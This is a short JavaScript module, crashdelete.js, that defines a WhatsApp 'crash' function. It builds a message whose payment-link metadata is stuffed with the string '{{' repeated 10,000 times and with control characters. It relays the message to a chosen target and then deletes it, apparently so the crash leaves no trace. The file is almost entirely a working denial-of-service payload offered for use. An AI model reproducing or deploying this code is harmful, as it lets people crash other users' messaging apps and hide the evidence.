// crashdelete.js
async function enpezee(hydro, target) {
  const payload = {
    extendedTextMessage: {
      text: " # 💰 - Farel?? • Why?? ",
      paymentLinkMetadata: {
        button: { displayText: "\x10" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) }
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "\x10" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) }
        },
        urlMetadata: {
          fbExperimentId: 999
        },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221
      }
    }
  };

  const msg = generateWAMessageFromContent(target, payload, {});

  await hydro.relayMessage(
    target,
    msg.message,
    {
      messageId: msg.key.id,
      participant: { jid: target },
    }
  );
  
  await hydro.sendMessage(target, {
    delete: msg.key,
  });
}

module.exports = { enpezee };